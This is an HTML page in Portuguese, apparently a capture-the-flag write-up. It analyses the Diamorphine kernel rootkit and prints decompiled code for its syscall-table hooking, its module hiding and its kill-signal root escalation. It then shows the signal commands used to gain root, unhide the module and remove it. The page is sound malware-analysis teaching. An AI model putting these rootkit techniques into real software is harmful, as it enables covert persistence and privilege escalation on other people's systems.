@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="pt">
+	<head>
+		<meta charset="UTF-8">
+    	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>HTB - Cyberpsychosis</title>
+		<link rel="stylesheet" type="text/css" href="/styles/global.css">
+		<link rel="icon" type="image/png" href="/images/icon.png">
+	</head>
+	<body>
+		<header>
+			<nav class="navbar">
+				<ul style="display: flex; list-style-type: none; padding: 0;">
+					<li style="margin-right: 20px;"><a href="/pt/index.html">H0ME</a></li>
+					<li style="margin-right: 20px;"><a href="/pt/pages/whoami.html">0xWHO4MI</a></li>
+					<li style="margin-right: 20px;"><a href="/pt/pages/articles.html">ART1G0S</a></li>
+					<li style="margin-right: 20px;"><a href="/pt/pages/writeups.html">WR1T3UPS</a></li>
+                    <li><a href="/en/index.html">EN-US</a></li>
+				</ul>
+			</nav>
+		</header>
+		<pre class="dystopian">
+▓█████▄   ▓██   ██▓   ██████   ▄▄▄█████▓   ▒█████     ██▓███     ██▓   ▄▄▄         ███▄    █ 
+▒██   █▌  ▒██   ██▒▒ ██    ▒   ▓  ██▒ ▓▒  ▒██▒  ██▒  ▓██░  ██  ▒▓██▒▒  ████▄       ██ ▀█   █ 
+░██   █▌   ▒██ ██░    ▓██▄     ▒ ▓██░ ▒░  ▒██░  ██▒  ▓██░ ██▓  ▒▒██▒▒  ██  ▀█▄    ▓██  ▀█ ██▒
+░▓█   █▌   ░ ▐██▓░    ▒   ██▒  ░ ▓██  ░   ▒██   ██░  ▒██▄█▓▒   ▒░██░░  ██▄▄▄▄██    ██   ▐▌██▒
+░█████▓    ░ ██▒░    ██████▒▒    ▒██▒ ░   ░ ████▓▒░  ▒██▒ ░    ░░██░   ▓█   ▓██   ▒██░   ▓██░
+▒▒▓  ▒      ██▒▒  ▒  ▒▓▒ ▒ ░    ▒ ░░   ░   ▒ ▒░ ░ ▒  ▓██       ░░▓     ▒▒   ▓▒█░  ░ ▒░   ▒ ▒ 
+░ ▒  ▒    ▓██ ░ ░ ░  ░▒  ░ ░      ░    ░   ░ ▒ ▒░ ░  ▒ ░        ▒ ░    ▒   ▒▒ ░  ░ ░░   ░ ▒░
+░ ░  ░    ▒ ▒  ░  ░    ░  ░      ░      ░   ░ ░ ▒  ░  ░          ▒ ░    ░   ▒        ░   ░ ░ 
+		</pre>
+        <div class="box_text">
+            <h1 style="text-align: center;">HTB - Cyberpsychosis</h1><hr>
+			<p>Este desafio envolve a análise e remoção de um rootkit do kernel Linux, o <u style="color: red;">diamorphine.ko</u>, um módulo de kernel malicioso que esconde processos e arquivos do sistema. O objetivo é investigar como ele funciona, elevando privilégios para root e desativando suas funções ocultas.</p>
+			<p>Identificação básica do tipo de binário:</p>
+			<div class="box_text">
+				<p>file diamorphine.ko </p>
+				<p>diamorphine.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=e6a635e5bd8219ae93d2bc26574fff42dc4e1105, with debug_info, not stripped</p>
+			</div>
+			<p>Buscando algumas informações adicionais sobre o arquivo, encontrei informações sobre a extensão <u style="color: red;">.ko</u> e identifiquei que se trata de um <a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html" target="_blank" style="color: aquamarine;text-decoration: underline;">módulo de kernel</a>. Para entender seu real funcionamento foi necessário realizar análise estática do binário usando o Ghidra.</p>
+			<p>Funções que realizei o disassembler e que considerei importantes na análise desse rootkit:</p>
+			<ul>
+				<li>diamorphine_init</li>
+				<li>module_hide</li>
+				<li>module_show</li>
+				<li>hacked_kill</li>
+			</ul>
+			<p>Este rootkit modifica a tabela de syscalls do Linux (<u style="color: red;">sys_call_table</u>), substituindo funções críticas como <u style="color: red;">kill</u>, <u style="color: red;">getdents</u> e <u style="color: red;">getdents64</u> para esconder arquivos, processos e permitir elevação de privilégios.</p>
+			<p>Então começo analisando a função de inicialização do rootkit:</p>
+			<div class="box_text">
+				<p>int diamorphine_init(void)</p>
+				<p>{</p>
+				<p>&nbsp;&nbsp;long lVar1;</p>
+				<p>&nbsp;&nbsp;ulong *puVar2;</p>
+				<p>&nbsp;&nbsp;int iVar3;</p>
+				<p>&nbsp;&nbsp;long in_GS_OFFSET;</p>
+				<p>&nbsp;&nbsp;ulong __force_order;</p>
+				<p>&nbsp;&nbsp;</p>
+				<p>&nbsp;&nbsp;lVar1 = *(long *)(in_GS_OFFSET + 0x28);</p>
+				<p>&nbsp;&nbsp;__sys_call_table = get_syscall_table_bf(); // &lt;-- Carrega a tabela de syscalls do sistema</p>
+				<p>&nbsp;&nbsp;iVar3 = -1;</p>
+				<p>&nbsp;&nbsp;if (__sys_call_table != (ulong *)0x0) { // &lt;-- Inicia o rootkit caso carregue a tabela de syscalls</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;cr0 = (*_commit_creds)();</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;module_hide(); // &lt;-- Chama uma função que esconde o módulo</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;kfree(__this_module.sect_attrs);</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;puVar2 = __sys_call_table; // &lt;-- Define um ponteiro para __sys_call_table</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;__this_module.sect_attrs = (module_sect_attrs *)0x0;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;orig_getdents = (t_syscall)__sys_call_table[0x4e]; // &lt;-- Salva a syscall original "getdents" na variável</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;orig_getdents64 = (t_syscall)__sys_call_table[0xd9]; // &lt;-- Salva a syscall original "getdents64" na variável</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;orig_kill = (t_syscall)__sys_call_table[0x3e]; // &lt;-- Salva a syscall original "kill" na variável</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;__sys_call_table[0x4e] = (ulong)hacked_getdents; // &lt;-- Define a função hacked_getdents como nova syscall para "getdents"</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;puVar2[0xd9] = (ulong)hacked_getdents64; // &lt;-- Define a função hacked_getdents64 como nova syscall para "getdents64"</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;puVar2[0x3e] = (ulong)hacked_kill; // &lt;-- Define a função hacked_kill como nova syscall para "kill"</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;iVar3 = 0;</p>
+				<p>&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;if (lVar1 != *(long *)(in_GS_OFFSET + 0x28)) {</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* WARNING: Subroutine does not return */</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;__stack_chk_fail();</p>
+				<p>&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;return iVar3;</p>
+				<p>}</p>
+			</div>
+			<p>O “<u style="color: red;">diamorphine_init</u>” é responsável por carregar a tabela de syscalls, ocultar o módulo com a chamada de “<u style="color: red;">module_hide()</u>” e mudar syscalls normais para syscalls manipuladas pelo Kernel Module.</p>
+			<p>Próximo passo é identificar como o “<u style="color: red;">module_hide</u>” funciona:</p>
+			<div class="box_text">
+				<p>void module_hide(void)</p>
+				<p>{</p>
+				<p>&nbsp;&nbsp;module_previous = __this_module.list.prev; // &lt;-- Armazena o módulo anterior ao atual</p>
+				<p>&nbsp;&nbsp;(__this_module.list.next)-&gt;prev = __this_module.list.prev; // &lt;-- Ajusta o ponteiro prev do módulo seguinte para apontar para o módulo anterior</p>
+				<p>&nbsp;&nbsp;(__this_module.list.prev)-&gt;next = __this_module.list.next; // &lt;-- Ajusta o ponteiro next do módulo anterior para apontar para o próximo módulo</p>
+				<p>&nbsp;&nbsp;__this_module.list.next = (list_head *)0xdead000000000100; // &lt;-- Aponta para o próximo módulo ser um valor inválido</p>
+				<p>&nbsp;&nbsp;__this_module.list.prev = (list_head *)0xdead000000000122; // &lt;-- Aponta para o módulo anterior ser um valor inválido</p>
+				<p>&nbsp;&nbsp;module_hidden = 1; // &lt;-- Define 1 indicando um True, dizendo que o módulo foi oculto</p>
+				<p>&nbsp;&nbsp;return;</p>
+				<p>}</p>
+			</div>
+			<p>Basicamente o <u style="color: red;">module_hide</u> manipula a lista de módulos para apontar valores inválidos para ele mesmo, além de armazenar o módulo anterior ao atual para uso futuro na variável <u style="color: red;">module_previous</u> e instruir para os outros módulos quem eles devem referenciar. Uma forma simples de explicar pode ser vista a seguir:</p>
+			<div class="box_text">
+				<p>// Estrutura onde os módulos estão conseguindo se visualizar</p>
+				<p>MODULE_PREV &lt;-&gt; MODULE_TO_HIDE &lt;-&gt; MODULE_NEXT</p><br>
+				<p>-&gt; MODULE_TO_HIDE instrui para o MODULE_NEXT que o anterior a ele é o MODULE_PREV</p>
+				<p>-&gt; MODULE_TO_HIDE instrui para o MODULE_NEXT que o próximo a ele é o MODULE_NEXT</p>
+				<p>-&gt; MODULE_TO_HIDE aponta como seu próximo módulo um valor inválido</p>
+				<p>-&gt; MODULE_TO_HIDE aponte como seu módulo anterior um valor inválido</p><br>
+				<p>// Estrutura final dos módulos originais do sistema</p>
+				<p>MODULE_PREV &lt;-&gt; MODULE_NEXT</p>
+				<p>(MODULE_TO_HIDE não é mais referenciado)</p><br>
+				<p>// Estrutura final do módulo malicioso</p>
+				<p>INVALID_VALUE &lt;-&gt; MODULE_TO_HIDE &lt;-&gt; INVALID_VALUE</p>
+				<p>(MODULE_TO_HIDE não referência para um valor válido)</p>
+			</div>
+			<p>Agora a função para mostra o módulo novamente é a “<u style="color: red;">module_show</u>”:</p>
+			<div class="box_text">
+				<p>void module_show(void)</p><br>
+				<p>{</p>
+				<p>&nbsp;&nbsp;__this_module.list.prev = module_previous; // Restaura o ponteiro do prev ao estado original</p>
+				<p>&nbsp;&nbsp;__this_module.list.next = module_previous-&gt;next; // Restaura o ponteiro do next ao estado original </p>
+				<p>&nbsp;&nbsp;(__this_module.list.next)-&gt;prev = &__this_module.list; // O ponteiro prev do próximo módulo é o módulo atual</p>
+				<p>&nbsp;&nbsp;(__this_module.list.prev)-&gt;next = (list_head *)0x1010c8; // O ponteiro next do módulo anterior é o módulo atual</p>
+				<p>&nbsp;&nbsp;module_hidden = 0; // &lt;-- Define 0 indicando um False, dizendo que o módulo voltou a ficar visível</p>
+				<p>&nbsp;&nbsp;return;</p>
+				<p>}</p>
+			</div>
+			<p>O <u style="color: red;">module_show</u> revela novamente o módulo e aparece na lista de módulos ao usar o comando lsmod.</p>
+			<p>Por fim analisei a função <u style="color: red;">hacked_kill</u> a função que é uma modificação da syscall <u style="color: red;">kill</u>:</p>
+			<div class="box_text">
+				<p>int hacked_kill(pt_regs *pt_regs)</p>
+				<p>{</p>
+				<p>&nbsp;&nbsp;undefined1 *puVar1;</p>
+				<p>&nbsp;&nbsp;list_head *plVar2;</p>
+				<p>&nbsp;&nbsp;int iVar3;</p>
+				<p>&nbsp;&nbsp;long lVar4;</p>
+				<p>&nbsp;&nbsp;undefined *puVar5;</p>
+				<p>&nbsp;&nbsp;</p>
+				<p>&nbsp;&nbsp;plVar2 = module_previous;</p>
+				<p>&nbsp;&nbsp;iVar3 = (int)pt_regs-&gt;si; // &lt;-- Armazena o SIG que é passado no comando kill nessa variável</p>
+				<p>&nbsp;&nbsp;if (iVar3 == 0x2e) { // &lt;-- Verifica se o SIG é 46 e em caso positivo entra nesse if, em caso negativo pula para a próxima instrução</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;if (module_hidden != 0) { // &lt;-- Verifica se o módulo está oculto e em caso positivo realiza a operação para revelar ele</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__this_module.list.next = module_previous-&gt;next;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(__this_module.list.next)-&gt;prev = &__this_module.list;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__this_module.list.prev = plVar2;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;module_hidden = 0;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plVar2-&gt;next = (list_head *)0x1010c8;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;// Caso o módulo não esteja oculto, ele se esconde novamente ao chamar o SIG 46</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;iVar3 = 0;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;(__this_module.list.next)-&gt;prev = __this_module.list.prev;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;module_previous = __this_module.list.prev;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;(__this_module.list.prev)-&gt;next = __this_module.list.next;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;__this_module.list.next = (list_head *)0xdead000000000100;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;__this_module.list.prev = (list_head *)0xdead000000000122;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;module_hidden = 1;</p>
+				<p>&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;else if (iVar3 == 0x40) { // &lt;-- Verifica se SIG é 64 e em caso positivo realiza elevação de privilégios root, em caso negativo pula para a próxima instrução</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;lVar4 = prepare_creds(); // &lt;-- Prepara estrutura de credenciais do kernel</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;iVar3 = 0;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;if (lVar4 != 0) {</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(undefined8 *)(lVar4 + 4) = 0; // &lt;-- Define o uid para 0</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(undefined8 *)(lVar4 + 0xc) = 0; // &lt;-- Define o suid para 0</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(undefined8 *)(lVar4 + 0x14) = 0; // &lt;-- Define o euid para 0</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(undefined8 *)(lVar4 + 0x1c) = 0; // &lt;-- Define o fsuid para 0</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;commit_creds(lVar4); // &lt;-- Aplica privilégios de root ao processo atual</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return iVar3;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;// Caso nenhuma das ações sejam realizadas, o bloco else é o último a ser executado. Verificando assim se SIG é 31, em caso positivo manipula processos para ocultar o processo, por fim volta a realizar a operação original da syscall kill</p>
+				<p>&nbsp;&nbsp;else { </p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;puVar5 = &init_task;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;if (iVar3 == 0x1f) {</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do {</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puVar1 = *(undefined1 **)(puVar5 + 0x8b8);</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puVar5 = puVar1 + -0x8b8;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (puVar1 == &DAT_001028f0) {</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -3;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} while ((int)pt_regs-&gt;di != *(int *)(puVar1 + 0x108));</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (puVar5 == (undefined *)0x0) {</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -3;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(uint *)(puVar1 + -0x88c) = *(uint *)(puVar1 + -0x88c) ^ 0x10000000;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;lVar4 = (*orig_kill)(pt_regs);</p>
+				<p>&nbsp;&nbsp;&nbsp;&nbsp;iVar3 = (int)lVar4;</p>
+				<p>&nbsp;&nbsp;}</p>
+				<p>&nbsp;&nbsp;return iVar3;</p>
+				<p>}</p>
+			</div>
+			<p>Resumindo cada SIG:</p>
+			<ul>
+				<li>SIG 46 (0x2e) → Altera entre esconder e revelar o rootkit.</li>
+				<li>SIG 64 (0x40) → Escala privilégios para root.</li>
+				<li>SIG 31 (0x1f) → Manipula processos para esconder determinados PIDs.</li>
+			</ul>
+			<p>Essa função é primordial na análise pois com ela é possível escalar privilégios para root e ocultar ou exibir o módulo do rootkit. A escalação de privilégios é possível pois analisando a estrutura de <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h" target="_blank" style="color: aquamarine; text-decoration: underline;">creds.h</a> e sua respectiva manipulação dos índices, vi que o hacked_kill altera o uid, suid, euid e fsuid para 0 ou seja para root.</p>
+			<p>Com toda a análise realizada e entendendo seu real funcionamento pude explorar o Kernel Module para elevar meus privilégios e desarmar o rootkit com o comando kill:</p>
+			<div class="box_text">
+				<p>// Escalando privilégios para root</p>
+				<p>~ $ kill -64 $$</p>
+				<p>kill -64 $$</p>
+				<p>~ # whoami</p>
+				<p>root</p>
+			</div>
+			<p>Agora é necessário revelar o módulo com <u style="color: red;">kill -46 $$</u>, para que ele apareça na lista de módulos com o <u style="color: red;">lsmod</u> e então seja removido:</p>
+			<div class="box_text">
+				<p>// Revelar o rootkit</p>
+				<p>~ # kill -46 $$</p>
+				<p>// Listar os módulos</p>
+				<p>~ # lsmod</p>
+				<p>diamorphine 16384 0 - Live 0xffffffffc0085000 (OE)</p>
+				<p>// Remover o rootkit</p>
+				<p>~ # rmmod diamorphine</p>
+			</div>
+			<p>Finalizo por aqui encontrando a flag em uma pasta que até então estava escondida pelo módulo:</p>
+			<div class="box_text">
+				<p>/// Busca pela flag</p>
+				<p>~ # find / -name diamorphine.ko</p>
+				<p>/opt/psychosis/diamorphine.ko</p>
+				<p>~ # cd /opt/psychosis</p>
+				<p>/opt/psychosis # ls</p>
+				<p>diamorphine.ko  flag.txt</p>
+				<p>/opt/psychosis # cat flag.txt</p>
+				<p>HTB{REDACTED}</p>
+			</div>
+			<p>Esse desafio mostra como malwares podem se comportar como operações legítimas no sistema e se esconder em meio a diversos outros processos e módulos legítimos.</p>
+			<hr>
+        </div>
+    </body>
+</html>
